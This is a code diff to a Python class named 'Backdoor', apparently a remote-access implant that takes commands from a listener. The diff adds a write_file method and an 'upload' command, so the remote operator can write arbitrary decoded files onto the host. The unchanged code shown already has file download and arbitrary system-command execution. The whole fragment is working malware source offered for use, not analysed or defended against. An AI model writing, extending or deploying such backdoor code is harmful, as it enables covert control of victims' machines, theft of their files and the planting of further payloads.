@@ -36,6 +36,12 @@ class Backdoor:
             # by encapsulating all special characters
             return base64.b64encode(file.read())
 
+    # Take a remote file to write on system
+    def write_file(self, path, content):
+        with open(path, "wb") as file:  # Write Binary file
+            file.write(base64.b64decode(content))  # Decoding content encoded in Listener.read_file()
+            return "[+] Upload successful"
+
     # Start the connection to the listener
     def run(self):
         while True:
@@ -53,6 +59,10 @@ class Backdoor:
             # Incoming command download with file path
             elif command[0] == "download":
                 command_result = self.read_file(command[1])
+
+            # Incoming upload command with file and content
+            elif command[0] == "upload":
+                command_result = self.write_file(command[1], command[2])
 
             else:
                 command_result = self.execute_system_command(command)
